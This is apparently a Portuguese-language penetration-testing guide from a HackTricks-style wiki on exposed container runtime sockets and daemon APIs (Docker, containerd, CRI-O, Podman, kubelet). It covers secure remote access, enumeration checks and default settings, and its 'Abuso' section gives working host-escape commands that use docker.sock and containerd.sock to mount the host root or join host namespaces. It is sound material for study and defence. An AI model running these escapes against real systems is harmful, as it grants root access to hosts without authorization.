# API de Runtime e Exposição do Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Muitas violações reais de containers não começam com uma fuga de namespace. Elas começam com o acesso ao plano de controle do runtime. Se um workload puder se comunicar com `dockerd`, `containerd`, CRI-O, Podman, ou kubelet através de um socket Unix montado ou um listener TCP exposto, o atacante pode ser capaz de solicitar um novo container com privilégios maiores, montar o sistema de arquivos do host, juntar-se aos namespaces do host ou recuperar informações sensíveis do nó. Nesses casos, a API do runtime é a verdadeira barreira de segurança, e comprometê‑la é funcionalmente próximo de comprometer o host.

É por isso que a exposição do socket do runtime deve ser documentada separadamente das proteções do kernel. Um container com seccomp, capabilities e MAC confinement ordinários ainda pode estar a uma chamada de API de distância do comprometimento do host se `/var/run/docker.sock` ou `/run/containerd/containerd.sock` estiverem montados dentro dele. O isolamento do kernel do container atual pode estar funcionando exatamente como projetado enquanto o plano de gerenciamento do runtime permanece totalmente exposto.

## Modelos de Acesso ao Daemon

Docker Engine tradicionalmente expõe sua API privilegiada através do socket Unix local em `unix:///var/run/docker.sock`. Historicamente também foi exposta remotamente através de listeners TCP como `tcp://0.0.0.0:2375` ou um listener protegido por TLS em `2376`. Expor o daemon remotamente sem TLS forte e autenticação de cliente efetivamente transforma a Docker API em uma interface remota com privilégios de root.

containerd, CRI-O, Podman, e kubelet expõem superfícies de alto impacto semelhantes. Os nomes e fluxos de trabalho diferem, mas a lógica não. Se a interface permitir que o chamador crie workloads, monte caminhos do host, recupere credenciais ou altere containers em execução, a interface é um canal de gerenciamento privilegiado e deve ser tratada como tal.

Caminhos locais comuns a verificar são:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Pilha mais antigas ou mais especializadas também podem expor endpoints como `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Estes são menos comuns em ambientes modernos, mas quando encontrados devem ser tratados com a mesma cautela porque representam superfícies de controle em tempo de execução em vez de soquetes de aplicação comuns.

## Acesso Remoto Seguro

Se um daemon deve ser exposto além do socket local, a conexão deve ser protegida com TLS e, preferencialmente, com autenticação mútua para que o daemon verifique o cliente e o cliente verifique o daemon. O antigo hábito de abrir o Docker daemon em HTTP puro por conveniência é um dos erros mais perigosos na administração de contêineres, porque a superfície da API é forte o suficiente para criar contêineres privilegiados diretamente.

O padrão histórico de configuração do Docker era o seguinte:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Em hosts baseados em systemd, a comunicação do daemon também pode aparecer como `fd://`, o que significa que o processo herda um socket pré-aberto do systemd em vez de vinculá-lo diretamente. A lição importante não é a sintaxe exata, mas a consequência para a segurança. No momento em que o daemon escuta além de um socket local com permissões restritas, a segurança de transporte e a autenticação do cliente tornam-se obrigatórias em vez de medidas opcionais de hardening.

## Abuso

Se um runtime socket estiver presente, confirme qual é, se existe um client compatível e se o acesso raw HTTP ou gRPC é possível:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Estes comandos são úteis porque distinguem entre um caminho inexistente, um socket montado mas inacessível e uma API privilegiada ativa. Se o cliente obtiver sucesso, a próxima questão é se a API pode lançar um novo container com um host bind mount ou compartilhamento do namespace do host.

### Exemplo completo: Docker Socket To Host Root

Se `docker.sock` estiver acessível, a fuga clássica é iniciar um novo container que monte o sistema de arquivos root do host e então executar `chroot` nele:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Isto fornece execução direta como root do host através do Docker daemon. O impacto não se limita à leitura de arquivos. Uma vez dentro do novo container, o atacante pode alterar arquivos do host, coletar credenciais, implantar persistência ou iniciar cargas de trabalho privilegiadas adicionais.

### Exemplo completo: Docker Socket To Host Namespaces

Se o atacante preferir entrada em namespaces em vez de acesso apenas ao sistema de arquivos:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Esse caminho alcança o host pedindo ao runtime para criar um novo container com exposição explícita do host-namespace em vez de explorar o atual.

### Exemplo completo: containerd Socket

Um socket `containerd` montado costuma ser igualmente perigoso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
O impacto, novamente, é o comprometimento do host. Mesmo que as ferramentas específicas do Docker estejam ausentes, outra API de runtime ainda pode oferecer o mesmo poder administrativo.

## Checks

O objetivo dessas verificações é responder se o container consegue alcançar qualquer plano de gerenciamento que deveria ter permanecido fora do limite de confiança.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
O que é interessante aqui:

- Um socket do runtime montado é geralmente uma primitiva administrativa direta em vez de mera divulgação de informação.
- Um listener TCP em `2375` sem TLS deve ser tratado como uma condição de comprometimento remoto.
- Variáveis de ambiente como `DOCKER_HOST` frequentemente revelam que a carga de trabalho foi intencionalmente projetada para falar com o runtime do host.

## Padrões do runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local por padrão | `dockerd` escuta no socket local e o daemon normalmente roda com privilégios de root | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | CLI sem daemon por padrão | Nenhum daemon privilegiado de longa duração é necessário para uso local ordinário; API sockets ainda podem ser expostos quando `podman system service` is enabled | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Socket local privilegiado | API administrativa exposta através do socket local e normalmente consumida por ferramentas de nível superior | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Socket local privilegiado | O endpoint CRI destina-se a componentes confiáveis locais ao nó | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | API de gerenciamento local ao nó | Kubelet não deve ser amplamente acessível a partir de Pods; o acesso pode expor estado dos pods, credenciais e funcionalidades de execução dependendo de authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |
